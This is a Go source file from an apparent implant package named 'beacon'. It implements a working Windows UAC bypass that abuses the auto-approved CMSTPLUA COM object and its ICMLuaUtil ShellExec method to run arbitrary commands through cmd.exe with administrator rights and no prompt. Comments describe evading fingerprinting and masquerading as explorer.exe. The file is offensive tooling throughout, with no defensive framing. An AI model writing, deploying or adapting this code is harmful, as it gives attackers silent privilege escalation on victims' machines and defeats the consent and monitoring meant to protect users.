//go:build windows

package beacon

import (
	"encoding/hex"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// CMSTPLUA is an auto-approved COM object (HKLM COMAutoApprovalList) that
// exposes ICMLuaUtil. Requesting it through the elevation moniker yields an
// ICMLuaUtil instance backed by a high-integrity broker process; ShellExec
// then launches our command line with that token. No registry writes, no
// spawned auto-elevating binaries, so no UACBypassExp-style behavior to
// fingerprint. The CLSID is rotated between builds, and current 25H2 builds
// additionally require the caller to masquerade as a trusted process
// (explorer.exe) before the auto-elevation is granted without a prompt.
const (
	clsidCMSTPLUA = "3E5FC7F9-9A51-4367-9063-A120244FBEC7"
	iidICMLuaUtil = "6EDD6D74-C007-4E75-B76A-E5740995E24C"
	clsctxLocal   = 0x4 // CLSCTX_LOCAL_SERVER
)

// icmluaUtilVtbl mirrors the ICMLuaUtil vtable layout: QI/AddRef/Release
// (0..2), six methods (3..8), then ShellExec at slot 9 and beyond.
type icmluaUtilVtbl struct {
	QueryInterface    uintptr
	AddRef            uintptr
	Release           uintptr
	Method1           uintptr
	Method2           uintptr
	Method3           uintptr
	Method4           uintptr
	Method5           uintptr
	Method6           uintptr
	ShellExec         uintptr
	SetRegistryString uintptr
}

// icmluaUtilIface is the MSVC-style COM interface: first field is the
// pointer to the vtable.
type icmluaUtilIface struct {
	lpVtbl *icmluaUtilVtbl
}

var (
	ole32 = windows.NewLazySystemDLL("ole32.dll")

	procCoInitializeEx = ole32.NewProc("CoInitializeEx")
	procCoUninitialize = ole32.NewProc("CoUninitialize")
	procCoGetObject    = ole32.NewProc("CoGetObject")

	oleaut32 = windows.NewLazySystemDLL("oleaut32.dll")

	procSysAllocString = oleaut32.NewProc("SysAllocString")
	procSysFreeString  = oleaut32.NewProc("SysFreeString")
)

// bindOpts3 mirrors BIND_OPTS3 used for CoGetObject.
type bindOpts3 struct {
	cbStruct         uint32
	dwFlags          uint32
	dwTickCountDeadl uint32
	dwTrackFlags     uint32
	dwClassContext   uint32
	lcid             uint32
	pServerInfo      uintptr
	hwnd             uintptr
	pPromptInfo      uintptr
}

// shellExecElevated runs commandLine with a high-integrity token via the
// CMSTPLUA elevation moniker. The caller must be an approval-mode
// administrator; current builds also require the caller to masquerade as
// explorer.exe, which masqueradeExplorer handles around the activation.
func shellExecElevated(commandLine string) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	// COINIT_APARTMENTTHREADED: the auto-elevation broker path behaves
	// correctly from an STA, matching the working C#/C++ PoCs.
	r1, _, _ := procCoInitializeEx.Call(0, 2)
	if r1 == 0x80010106 { // S_FALSE: already initialized on this thread
		r1 = 0
	}
	if r1 != 0 {
		return fmt.Errorf("beacon: cmlua CoInitializeEx failed 0x%08x", uint32(r1))
	}
	defer procCoUninitialize.Call()

	restore, err := masqueradeExplorer()
	if err != nil {
		return fmt.Errorf("beacon: cmlua masquerade: %w", err)
	}
	defer restore()

	moniker, err := syscall.UTF16PtrFromString("Elevation:Administrator!new:{" + clsidCMSTPLUA + "}")
	if err != nil {
		return err
	}
	iid, err := guidFromString(iidICMLuaUtil)
	if err != nil {
		return err
	}
	bopts := bindOpts3{
		cbStruct:       uint32(unsafe.Sizeof(bindOpts3{})),
		dwClassContext: clsctxLocal,
	}
	var pLua unsafe.Pointer
	r1, _, _ = procCoGetObject.Call(
		uintptr(unsafe.Pointer(moniker)),
		uintptr(unsafe.Pointer(&bopts)),
		uintptr(unsafe.Pointer(&iid)),
		uintptr(unsafe.Pointer(&pLua)),
	)
	if r1 != 0 {
		return fmt.Errorf("beacon: cmlua CoGetObject failed 0x%08x (is the user an admin in approval mode?)", uint32(r1))
	}
	luaI := (*icmluaUtilIface)(pLua)
	defer func() {
		syscall.Syscall(luaI.lpVtbl.Release, 1, uintptr(pLua), 0, 0)
	}()

	// ShellExec(LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory,
	// ULONG fMask, ULONG nShow)
	file, err := syscall.UTF16PtrFromString(`C:\Windows\System32\cmd.exe`)
	if err != nil {
		return err
	}
	params, err := syscall.UTF16PtrFromString(commandLine)
	if err != nil {
		return err
	}
	r1, _, _ = syscall.Syscall6(luaI.lpVtbl.ShellExec, 6,
		uintptr(pLua), uintptr(unsafe.Pointer(file)), uintptr(unsafe.Pointer(params)), 0, 0, 0)
	if r1 != 0 {
		return fmt.Errorf("beacon: cmlua ShellExec failed 0x%08x", uint32(r1))
	}
	return nil
}

// guidFromString parses a "{D1-D2-D3-D4}" or "D1-D2-D3-D4" GUID string into
// the 16-byte in-memory layout (first three fields little-endian).
func guidFromString(s string) ([16]byte, error) {
	var g [16]byte
	hexStr := strings.ReplaceAll(strings.Trim(s, "{}"), "-", "")
	if len(hexStr) != 32 {
		return g, fmt.Errorf("beacon: malformed guid %q", s)
	}
	b, err := hex.DecodeString(hexStr)
	if err != nil {
		return g, fmt.Errorf("beacon: malformed guid %q", s)
	}
	g[0], g[1], g[2], g[3] = b[3], b[2], b[1], b[0]
	g[4], g[5] = b[5], b[4]
	g[6], g[7] = b[7], b[6]
	copy(g[8:], b[8:])
	return g, nil
}
